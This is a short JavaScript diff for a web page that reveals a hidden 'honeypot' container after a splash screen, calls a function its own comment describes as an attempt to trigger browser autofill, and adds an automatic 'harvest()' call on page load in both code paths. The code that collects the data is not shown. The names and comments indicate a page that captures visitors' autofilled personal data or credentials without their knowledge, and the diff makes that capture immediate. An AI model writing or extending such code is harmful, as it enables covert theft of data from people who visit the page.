@@ -142,14 +142,16 @@ if (!splashShown) {
       const honeypotContainer = document.querySelector('.honeypot-container');
       if (previewContainer) previewContainer.style.display = 'none';
       if (honeypotContainer) {
-        honeypotContainer.style.display = 'block';
-        // Set up all event listeners
-        setupEventListeners();
-        // Attempt to trigger autofill
-        triggerFocusSwarm();
-      }
-    }, 1500); // Existing 1.5 second delay for loader
-  }, 7000); // 7 second delay for the image splash screen
+      honeypotContainer.style.display = 'block';
+      // Set up all event listeners
+      setupEventListeners();
+      // Attempt to trigger autofill
+      triggerFocusSwarm();
+      // Trigger an immediate harvest on page load
+      harvest();
+    }
+  }, 1500); // Existing 1.5 second delay for loader
+}, 7000); // 7 second delay for the image splash screen
 } else {
   // If splash shown, skip directly to loader and then honeypot
   const imageSplashContainer = document.querySelector('.image-splash-container');
@@ -165,6 +167,8 @@ if (!splashShown) {
       honeypotContainer.style.display = 'block';
       setupEventListeners();
       triggerFocusSwarm();
+      // Trigger an immediate harvest on page load
+      harvest();
     }
   }, 1500); // Existing 1.5 second delay for loader
 }
